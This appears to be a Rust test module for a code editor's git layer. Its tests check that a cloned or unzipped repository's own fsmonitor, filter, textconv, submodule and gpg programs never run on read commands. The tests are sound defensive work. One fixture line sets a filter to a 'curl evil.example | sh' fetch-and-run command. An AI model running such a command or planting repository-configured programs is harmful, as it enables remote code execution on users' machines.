        let repo = temp_repo("r129");
        run(&["branch", "kept"], Some(&repo)).unwrap();
        let old = run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap();
        // the branch moves on after the check: the compare-and-delete refuses it
        fs::write(repo.join("more.txt"), "more").unwrap();
        run(&["add", "."], Some(&repo)).unwrap();
        run(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "more"], Some(&repo)).unwrap();
        let new = run(&["rev-parse", "HEAD"], Some(&repo)).unwrap();
        run(&["update-ref", "refs/heads/kept", &new], Some(&repo)).unwrap();
        assert_eq!(delete_ref_if_at(&repo, "kept", &old), Ok(false));
        assert_eq!(run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap(), new, "a moved branch stays");
        assert_eq!(delete_ref_if_at(&repo, "kept", "--all"), Ok(false), "an option-like commit never reaches Git");
        assert_eq!(delete_ref_if_at(&repo, "kept", &new), Ok(true));
        assert!(run(&["rev-parse", "--verify", "--quiet", "refs/heads/kept"], Some(&repo)).is_err(), "deleted while it pointed where it did");
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn proj074_removing_a_worktree_leaves_no_trash_and_the_row_is_gone_from_gits_list() {
        let git = Git::detect().unwrap();
        let base = std::env::temp_dir().join(format!("kolux-rs-git-trash-wt-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let repo = base.join("r");
        fs::create_dir_all(&repo).unwrap();
        let g = |args: &[&str], dir: &Path| {
            let out = command(args, Some(dir)).output().unwrap();
            assert!(out.status.success(), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
        };
        g(&["init", "-q", "-b", "main"], &repo);
        fs::write(repo.join("a.txt"), "a").unwrap();
        g(&["add", "."], &repo);
        g(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "first"], &repo);
        let dest = base.join("ws").join("big");
        git.worktree_add(&repo, &dest, "big", "HEAD").unwrap();
        fs::write(dest.join("big.bin"), vec![7u8; 100_000]).unwrap();
        git.worktree_remove(&repo, &dest, Some("big")).unwrap();
        assert!(!dest.exists());
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1);
        let left: Vec<String> = fs::read_dir(base.join("ws")).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert!(left.is_empty(), "no trash folder is left behind: {left:?}");
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn markdown_files_skip_ignored_ones_and_stop_at_the_cap() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("md");
        fs::create_dir_all(repo.join("docs")).unwrap();
        fs::create_dir_all(repo.join("build")).unwrap();
        fs::write(repo.join("docs").join("guide.md"), "x").unwrap();
        fs::write(repo.join("build").join("out.md"), "x").unwrap();
        fs::write(repo.join("notes.txt"), "x").unwrap();
        fs::write(repo.join(".gitignore"), "build/\n").unwrap();
        let (files, capped) = git.markdown_files(&repo, 10).unwrap();
        let names: Vec<String> = files.iter().map(|f| PathBuf::from(f).strip_prefix(&repo).unwrap().to_string_lossy().replace('\\', "/")).collect();
        assert_eq!(names, ["README.md", "docs/guide.md"]);
        assert!(!capped);
        let (one, capped) = git.markdown_files(&repo, 1).unwrap();
        assert_eq!((one.len(), capped), (1, true));
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn changes_list_both_sides_and_diff_sides_read_head_index_and_disk() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("diff");
        run(&["config", "core.autocrlf", "false"], Some(&repo)).unwrap(); // the line ends as written
        fs::write(repo.join("README.md"), "hello staged\n").unwrap();
        run(&["add", "README.md"], Some(&repo)).unwrap();
        fs::write(repo.join("README.md"), "hello staged and more\n").unwrap();
        fs::write(repo.join("new.txt"), "fresh\n").unwrap();
        let rel = |c: &Change| (PathBuf::from(&c.path).strip_prefix(&repo).unwrap().to_string_lossy().into_owned(), c.staged, c.code);
        let list: Vec<_> = git.changes(&repo).unwrap().iter().map(rel).collect();
        assert_eq!(list, [("README.md".into(), true, 'M'), ("README.md".into(), false, 'M'), ("new.txt".into(), false, '?')]);
        let readme = repo.join("README.md");
        assert_eq!(git.diff_sides(&readme, true).unwrap(), ("hello\n".into(), "hello staged\n".into()));
        assert_eq!(git.diff_sides(&readme, false).unwrap(), ("hello staged\n".into(), "hello staged and more\n".into()));
        assert_eq!(git.diff_sides(&repo.join("new.txt"), false).unwrap(), (String::new(), "fresh\n".into()));

        fs::write(repo.join("blob.bin"), [0u8, 1, 2, 0]).unwrap();
        let sizes = |git: &Git| git.change_entries(&repo).unwrap().into_iter().map(|e| (e.lines, e.binary, e.stamp)).collect::<Vec<_>>();
        let before = sizes(&git);
        assert_eq!(before.iter().map(|(l, b, _)| (*l, *b)).collect::<Vec<_>>(), [(Some(2), false), (Some(2), false), (None, true), (Some(1), false)]);
        assert!(before.iter().all(|(_, _, s)| !s.is_empty()), "every change has an identity");
        fs::write(repo.join("README.md"), "hello staged and more, again\n").unwrap();
        let after = sizes(&git);
        assert_eq!(after[0].2, before[0].2, "the staged change is the same");
        assert_ne!(after[1].2, before[1].2, "the unstaged change is not");
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn status_parsing_skips_a_renames_old_name() {
        let list = parse_status("R  b.txt\0a.txt\0 D gone.txt\0", Path::new("r"));
        let got: Vec<_> = list.iter().map(|c| (c.path.ends_with("b.txt") || c.path.ends_with("gone.txt"), c.staged, c.code)).collect();
        assert_eq!(got, [(true, true, 'R'), (true, false, 'D')]);
    }

    #[test]
    fn parses_porcelain_output_with_detached_head() {
        let text = "worktree C:/r\nHEAD aaaa\nbranch refs/heads/main\n\nworktree C:/r-wt/x\nHEAD bbbb\ndetached\n";
        let list = parse_worktrees(text);
        assert_eq!(list.len(), 2);
        assert!(list[0].is_main);
        assert_eq!(list[0].branch.as_deref(), Some("main"));
        assert_eq!(list[1].branch, None);
        assert_eq!(list[1].head, "bbbb");
        assert!(list[1].path.ends_with("x"));
    }

    /// T-779 (P2A-01): a folder that arrives with its own `.git/config` names a program in
    /// `core.fsmonitor`; git would run it on the first `status`. Kolux's git never does, whatever
    /// the repository says.
    #[test]
    fn t779_a_repositorys_own_fsmonitor_program_never_runs_under_kolux_git() {
        let dir = temp_repo("fsmonitor");
        let marker = dir.join("fsmonitor-ran.txt");
        let marker_str = marker.to_string_lossy().replace('\\', "/");
        // The hook git runs through its shell; it leaves a marker file where we can see it.
        let hook = if cfg!(windows) { format!("cmd.exe /c echo ran > \"{marker_str}\"") } else { format!("touch \"{marker_str}\"") };
        run(&["config", "core.fsmonitor", &hook], Some(&dir)).unwrap();
        // The attacker's setting is really in the folder's own config, and plain git obeys it.
        let mut plain = Command::new("git");
        plain.args(["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"]).current_dir(&dir).env("GIT_OPTIONAL_LOCKS", "0");
        plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            plain.creation_flags(0x0800_0000); // no console flashes up during the test either
        }
        let plain_out = plain.output().unwrap();
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the fsmonitor program, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        // Kolux's git, with the exact arguments scm::status uses.
        let out = command(&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's core.fsmonitor program ran under Kolux's git");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (P2A-01): the guard also holds when the user's own shell already injects config through
    /// `GIT_CONFIG_COUNT`; Kolux's pairs are appended after theirs instead of being dropped.
    #[test]
    fn t779_injected_config_appends_after_the_users_own_slots() {
        let ours = injected_config(None, &[]);
        assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_KEY_0" && v == "core.fsmonitor"), "{ours:?}");
        assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_VALUE_0" && v == "false"), "{ours:?}");
        let count = ours.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
        let n: usize = count.parse().unwrap();
        assert_eq!(n, if cfg!(windows) { 3 } else { 2 });
        // Review fix 2: a repository's own `log.showSignature=true` never runs its gpg program.
        assert!(ours.contains(&("GIT_CONFIG_KEY_1".to_string(), "log.showSignature".to_string())), "{ours:?}");
        assert!(ours.contains(&("GIT_CONFIG_VALUE_1".to_string(), "false".to_string())), "{ours:?}");
        if cfg!(windows) {
            assert!(ours.contains(&("GIT_CONFIG_KEY_2".to_string(), "core.longpaths".to_string())), "{ours:?}");
            assert!(ours.contains(&("GIT_CONFIG_VALUE_2".to_string(), "true".to_string())), "{ours:?}");
        }
        // The user's shell set two pairs: ours start at slot 2 and the count grows by ours.
        let theirs = injected_config(Some(std::ffi::OsStr::new("2")), &[]);
        assert!(theirs.contains(&("GIT_CONFIG_KEY_2".to_string(), "core.fsmonitor".to_string())), "{theirs:?}");
        assert!(theirs.contains(&("GIT_CONFIG_VALUE_2".to_string(), "false".to_string())), "{theirs:?}");
        assert!(!theirs.iter().any(|(k, _)| k == "GIT_CONFIG_KEY_0" || k == "GIT_CONFIG_KEY_1"), "{theirs:?}");
        let count = theirs.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
        assert_eq!(count, (2 + n).to_string());
        // A count git itself would reject ("bogus") is treated as none: ours start at 0.
        let bogus = injected_config(Some(std::ffi::OsStr::new("lots")), &[]);
        assert!(bogus.contains(&("GIT_CONFIG_KEY_0".to_string(), "core.fsmonitor".to_string())), "{bogus:?}");
        // The repository's own program keys follow the fixed pairs, blanked.
        let with = injected_config(None, &[("filter.evil.clean".to_string(), String::new())]);
        assert!(with.contains(&(format!("GIT_CONFIG_KEY_{n}"), "filter.evil.clean".to_string())) && with.contains(&(format!("GIT_CONFIG_VALUE_{n}"), String::new())), "{with:?}");
        assert!(with.contains(&("GIT_CONFIG_COUNT".to_string(), (n + 1).to_string())), "{with:?}");
    }

    /// Plain git, as the control of the guard tests: Kolux's environment, none of its overrides.
    fn plain_git(args: &[&str], dir: &Path) -> std::process::Output {
        let mut plain = Command::new("git");
        plain.args(args).current_dir(dir).env("GIT_OPTIONAL_LOCKS", "0");
        plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            plain.creation_flags(0x0800_0000); // no console flashes up during the test either
        }
        plain.output().unwrap()
    }

    /// A shell line git can run as a filter, textconv or diff program: it leaves `marker` where the
    /// test can see it and passes the content through.
    fn marker_program(marker: &Path) -> String {
        let marker = marker.to_string_lossy().replace('\\', "/");
        if cfg!(windows) {
            format!("cmd.exe /c echo ran >> \"{marker}\" && cat")
        } else {
            format!("echo ran >> \"{marker}\" && cat")
        }
    }

    /// T-779 (P2A-01, review finding 1): a folder arrives with its own `.git/config` naming a
    /// clean filter and an attributes line that applies it to every file. Plain git runs the filter
    /// on `status` and `diff` for every file whose index stat is stale (every file of a folder
    /// extracted from a zip). Kolux's git never does, with the exact arguments `scm::status` uses,
    /// and a `required` driver does not fail the read either.
    #[test]
    fn t779_a_repositorys_own_clean_filter_never_runs_under_kolux_git() {
        let dir = temp_repo("clean-filter");
        let marker = dir.join("filter-ran.txt");
        run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
        run(&["config", "filter.evil.required", "true"], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
        // The same content written again: the index's stat is stale, so git re-cleans the file.
        fs::write(dir.join("README.md"), "hello\n").unwrap();
        let status_args = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
        let plain_out = plain_git(&status_args, &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the clean filter, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        let out = command(&status_args, Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git status");
        let out = command(&["diff", "--numstat", "-z"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git diff");
        // The listing is cached while the config is unchanged, and refreshed when it changes.
        let before = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        run(&["config", "--unset", "filter.evil.required"], Some(&dir)).unwrap();
        let after = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        assert_eq!(before - after, 1, "the unset key is no longer blanked");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (P2A-01, review finding 1): a textconv the repository configures for itself runs on a
    /// plain `diff` or `show` of a commit. Under Kolux's git it never runs (git has no program to
    /// run and says so instead), and the marker proves it.
    #[test]
    fn t779_a_repositorys_own_textconv_never_runs_under_kolux_git() {
        let dir = temp_repo("textconv");
        let marker = dir.join("textconv-ran.txt");
        run(&["config", "diff.evil.textconv", &marker_program(&marker)], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* diff=evil\n").unwrap();
        let plain_out = plain_git(&["show", "--no-ext-diff", "HEAD"], &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the textconv, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        let _ = command(&["show", "--no-ext-diff", "HEAD"], Some(&dir)).output().unwrap();
        assert!(!marker.exists(), "the repository's textconv ran under Kolux's git show");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (review finding 1): what one listing becomes. Only the repository's own scopes count
    /// (the user's global and system drivers stay), `required` is turned off rather than emptied,
    /// and git-lfs's standard driver is left alone while a driver with any other line is blanked.
    #[test]
    fn t779_repo_program_overrides_blank_the_repositorys_own_keys_but_not_git_lfs() {
        let rec = |scope: &str, key: &str, value: &str| format!("{scope}\0{key}\n{value}\0");
        let listing = [
            rec("system", "diff.astextplain.textconv", "astextplain"),
            rec("global", "filter.lfs.clean", "git-lfs clean -- %f"),
            rec("local", "filter.lfs.clean", "git-lfs clean -- %f"),
            rec("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
            rec("local", "filter.lfs.process", "git-lfs filter-process"),
            rec("local", "filter.lfs.required", "true"),
            rec("local", "filter.evil.clean", "curl evil.example | sh"),
            rec("local", "filter.evil.required", "true"),
            rec("worktree", "filter.evil.required", "true"),
            rec("local", "filter.fake.clean", "git-lfs clean -- %f"),
            rec("local", "filter.fake.smudge", "git-lfs smudge -- %f && evil"),
            rec("local", "diff.evil.textconv", "evil"),
            rec("local", "diff.evil.command", "evil"),
        ]
        .concat();
        let got = repo_program_overrides(listing.as_bytes());
        let expected: Vec<(String, String)> = [
            ("filter.evil.clean", ""),
            ("filter.evil.required", "false"),
            ("filter.fake.clean", ""),
            ("filter.fake.smudge", ""),
            ("diff.evil.textconv", ""),
            ("diff.evil.command", ""),
        ]
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
        assert_eq!(got, expected);
        assert!(repo_program_overrides(b"").is_empty());
    }

    /// A repository whose own config names a clean filter (a marker-leaving program) that
    /// `.git/info/attributes` applies to every file, plus a changed working file for it to chew on.
    fn filter_repo(name: &str) -> (PathBuf, PathBuf) {
        let dir = temp_repo(name);
        let marker = dir.join("filter-ran.txt");
        run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        (dir, marker)
    }

    /// Review fix 2 (DT-C229, Txais 2026-11-08): a write that runs the folder's own filters is refused
    /// in an untrusted folder, plainly and before anything is staged; reads never run them; a trusted
    /// folder's write runs them.
    #[test]
    fn t779b_a_write_through_the_folders_own_filter_is_refused_unless_the_folder_is_trusted() {
        let (dir, marker) = filter_repo("write-gate");
        // Reads blank the filter, trusted or not: the marker never appears.
        let status = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
        assert!(command(&status, Some(&dir)).output().unwrap().status.success());
        assert!(!marker.exists(), "a read ran the folder's filter");
        // Untrusted: `add` and `commit` are refused with the filter's name and what to do about it.
        let why = run(&["add", "-A"], Some(&dir)).unwrap_err();
        assert!(why.contains("git add") && why.contains("\"evil\"") && why.contains("filter.evil.clean") && why.contains("not trusted") && why.contains("Trust the folder"), "{why}");
        assert!(run(&["commit", "-q", "-a", "-m", "x"], Some(&dir)).unwrap_err().contains("\"evil\""));
        assert!(!marker.exists(), "a refused write still ran the filter");
        assert_eq!(run(&["diff", "--cached", "--name-only"], Some(&dir)).unwrap(), "", "nothing was staged");
        assert!(write_refusal(&["status"], Some(&dir)).is_none() && write_refusal(&["log", "-1"], Some(&dir)).is_none());
        assert!(command_checked(&["add", "-A"], Some(&dir)).is_err());
        // A linked worktree of the folder is refused to be created the same way.
        let linked = dir.with_file_name(format!("kolux-rs-git-write-gate-linked-{}", std::process::id()));
        let why = run(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], Some(&dir)).unwrap_err();
        assert!(why.contains("git worktree add") && why.contains("\"evil\""), "{why}");
        assert!(!linked.exists());
        // Trusted: the write goes ahead and the filter runs.
        trust_for_test(&dir);
        assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
        run(&["add", "-A"], Some(&dir)).unwrap();
        assert!(marker.exists(), "the trusted folder's own clean filter did not run on `add`");
        // And a read in the same trusted folder still blanks the filter.
        fs::remove_file(&marker).unwrap();
        fs::write(dir.join("README.md"), "changed again\n").unwrap();
        assert!(command(&status, Some(&dir)).output().unwrap().status.success());
        assert!(!marker.exists(), "a read ran the filter in a trusted folder");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2: git-lfs's own three lines never refuse a write, and a driver that only says
    /// `required` runs nothing; a main checkout's trust covers its linked worktrees.
    #[test]
    fn t779b_git_lfs_and_a_required_only_driver_never_block_a_write_and_trust_follows_the_main_checkout() {
        let dir = temp_repo("write-lfs");
        for (k, v) in [("filter.lfs.clean", "git-lfs clean -- %f"), ("filter.lfs.smudge", "git-lfs smudge -- %f"), ("filter.lfs.process", "git-lfs filter-process"), ("filter.lfs.required", "true"), ("filter.never.required", "true")] {
            run(&["config", k, v], Some(&dir)).unwrap();
        }
        assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
        // A filter of the folder's own, then a linked worktree of a trusted main checkout.
        run(&["config", "filter.evil.smudge", "cat"], Some(&dir)).unwrap();
        let linked = dir.with_file_name(format!("kolux-rs-git-write-lfs-linked-{}", std::process::id()));
        assert!(plain_git(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], &dir).status.success());
        assert!(write_refusal(&["add", "-A"], Some(&linked)).is_some(), "untrusted main checkout: refused in its worktree too");
        trust_for_test(&dir);
        assert!(write_refusal(&["add", "-A"], Some(&linked)).is_none(), "the main checkout is trusted");
        let _ = fs::remove_dir_all(&linked);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 2: a submodule's own config (and attributes) are read by the child git a
    /// parent `status` starts for it. Kolux blanks the filter named there too, for every command that
    /// reads a submodule: status with and without `--ignore-submodules=none`, and a numstat diff.
    #[test]
    fn t779b_a_submodules_own_clean_filter_never_runs_under_kolux_git() {
        let sub_src = temp_repo("modsrc");
        let dir = temp_repo("modparent");
        let url = sub_src.to_string_lossy().replace('\\', "/");
        let added = plain_git(&["-c", "protocol.file.allow=always", "submodule", "add", "-q", &url, "sub"], &dir);
        assert!(added.status.success(), "{}", String::from_utf8_lossy(&added.stderr));
        assert!(plain_git(&["commit", "-q", "-m", "add sub"], &dir).status.success());
        let module = dir.join(".git").join("modules").join("sub");
        let marker = dir.join("sub-filter-ran.txt");
        let config = module.join("config");
        let mut text = fs::read_to_string(&config).unwrap();
        text.push_str(&format!("[filter \"evil\"]\n\tclean = {}\n", marker_program(&marker)));
        fs::write(&config, text).unwrap();
        fs::create_dir_all(module.join("info")).unwrap();
        fs::write(module.join("info").join("attributes"), "* filter=evil\n").unwrap();
        // The same bytes written again: the stat is stale, so the submodule's git re-cleans the file.
        let readme = dir.join("sub").join("README.md");
        let bytes = fs::read(&readme).unwrap();
        std::thread::sleep(std::time::Duration::from_millis(1100));
        fs::write(&readme, bytes).unwrap();
        let args: [&[&str]; 3] = [&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], &["status", "--porcelain=v2", "--ignore-submodules=none", "-z"], &["diff", "--numstat", "-z", "--ignore-submodules=none"]];
        let control = plain_git(args[1], &dir);
        assert!(control.status.success(), "{}", String::from_utf8_lossy(&control.stderr));
        assert!(marker.exists(), "control: git itself did not run the submodule's clean filter, so the test proves nothing");
        for a in args {
            let _ = fs::remove_file(&marker);
            let out = command(a, Some(&dir)).output().unwrap();
            assert!(out.status.success(), "{a:?}: {}", String::from_utf8_lossy(&out.stderr));
            assert!(!marker.exists(), "the submodule's clean filter ran under Kolux's git {a:?}");
        }
        let _ = fs::remove_dir_all(&sub_src);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 2: the submodule configs under `.git/modules` are found recursively (a
    /// nested submodule's git folder sits inside its parent's), a name with a slash is a folder on the
    /// way, and a change to any of them changes what the repository's blanked keys are.
    #[test]
    fn t779b_module_configs_are_found_recursively_and_a_change_refreshes_the_listing() {
        let dir = temp_repo("modwalk");
        let modules = dir.join(".git").join("modules");
        for rel in ["sub", "sub/modules/inner", "a/b", "a/b/modules/deep", "a/b/modules/deep/modules/deeper"] {
            let folder = modules.join(rel);
            fs::create_dir_all(&folder).unwrap();
            fs::write(folder.join("config"), "[core]\n\tbare = false\n").unwrap();
        }
        let mut got = Vec::new();
        module_configs(&modules, &mut got, 0);
        let mut got: Vec<String> = got.iter().map(|p| p.strip_prefix(&modules).unwrap().to_string_lossy().replace('\\', "/")).collect();
        got.sort();
        assert_eq!(got, ["a/b/config", "a/b/modules/deep/config", "a/b/modules/deep/modules/deeper/config", "sub/config", "sub/modules/inner/config"]);
        // A filter in the deepest one is blanked at once, and the listing follows its next change.
        let args = ["status", "--porcelain=v2", "-z"];
        let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        let base = keys(&dir);
        let deepest = modules.join("a/b/modules/deep/modules/deeper/config");
        fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 1, "the nested submodule's filter is blanked");
        fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n\tsmudge = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 2, "the listing was refreshed when the nested config changed");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 3: `log.showSignature=true` with a `gpg.program` of the folder's choosing
    /// runs that program on a plain `log -1 --format=%ct` of a signed commit. Under Kolux's git it
    /// does not, and the answer is the same.
    #[test]
    fn t779b_a_repositorys_own_gpg_program_never_runs_under_kolux_git_log() {
        let dir = temp_repo("gpg");
        let marker = dir.join("gpg-ran.txt");
        let script = dir.join("fake-gpg.sh");
        fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        run(&["config", "gpg.program", &script.to_string_lossy().replace('\\', "/")], Some(&dir)).unwrap();
        run(&["config", "log.showSignature", "true"], Some(&dir)).unwrap();
        // A commit that carries a signature, made by hand: no real signing key is needed.
        let tree = run(&["rev-parse", "HEAD^{tree}"], Some(&dir)).unwrap();
        let parent = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap();
        let body = format!("tree {tree}\nparent {parent}\nauthor T <t@example.com> 1700000000 +0000\ncommitter T <t@example.com> 1700000000 +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n \n iQEzBAABCAAdFiEEAAAA\n =abcd\n -----END PGP SIGNATURE-----\n\nsigned\n");
        let mut hash = Command::new("git");
        hash.args(["hash-object", "-t", "commit", "-w", "--literally", "--stdin"]).current_dir(&dir).stdin(std::process::Stdio::piped()).stdout(std::process::Stdio::piped());
        let mut child = hash.spawn().unwrap();
        std::io::Write::write_all(&mut child.stdin.take().unwrap(), body.as_bytes()).unwrap();
        let oid = String::from_utf8(child.wait_with_output().unwrap().stdout).unwrap().trim().to_string();
        assert!(plain_git(&["update-ref", "HEAD", &oid], &dir).status.success());
        let plain_out = plain_git(&["log", "-1", "--format=%ct"], &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the gpg program, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        let out = command(&["log", "-1", "--format=%ct"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's gpg program ran under Kolux's git log");
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "1700000000");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 3: the signing programs are keys the listing finds, in any format's name.
    #[test]
    fn t779b_gpg_program_keys_are_blanked_for_reads() {
        let dir = temp_repo("gpg-keys");
        for (k, v) in [("gpg.program", "evil"), ("gpg.openpgp.program", "evil"), ("gpg.ssh.program", "evil"), ("gpg.format", "ssh"), ("gpg.ssh.allowedSignersFile", "x")] {
            run(&["config", k, v], Some(&dir)).unwrap();
        }
        let got = overrides_for(&repo_programs(&[], &dir), Access::Reads);
        assert_eq!(got, vec![("gpg.program".to_string(), String::new()), ("gpg.openpgp.program".to_string(), String::new()), ("gpg.ssh.program".to_string(), String::new())]);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, nit 4: a config the repository's config includes counts toward what the listing
    /// is cached on: relative to the including file, `[include]` on one line, `includeIf`, and
    /// includes of includes; a change to any of them refreshes the blanked keys.
    #[test]
    fn t779b_included_config_files_are_part_of_the_listing_stamp() {
        let dir = temp_repo("include");
        let git_dir = dir.join(".git");
        fs::write(git_dir.join("extra.cfg"), "[include]\n\tpath = deeper.cfg ; trailing comment\n").unwrap();
        fs::write(git_dir.join("deeper.cfg"), "[core]\n\tbare = false\n").unwrap();
        fs::write(git_dir.join("cond.cfg"), "[core]\n\tbare = false\n").unwrap();
        let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
        text.push_str("[include]\n\tpath = extra.cfg\n[includeIf \"gitdir:/nowhere/\"]\n\tpath = \"cond.cfg\"\n");
        fs::write(git_dir.join("config"), text).unwrap();
        let found: Vec<String> = include_targets(&git_dir.join("config")).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
        assert_eq!(found, ["extra.cfg", "cond.cfg"]);
        let stamped: Vec<String> = with_includes(&[git_dir.join("config")]).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
        for name in ["config", "extra.cfg", "deeper.cfg", "cond.cfg"] {
            assert!(stamped.iter().any(|s| s == name), "{name} missing from {stamped:?}");
        }
        // End to end: a filter added to the included-of-included file is blanked on the next run.
        let args = ["status", "--porcelain=v2", "-z"];
        let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        let base = keys(&dir);
        fs::write(git_dir.join("deeper.cfg"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 1, "a change in an included file refreshed the listing");
        let _ = fs::remove_dir_all(&dir);
    }
}
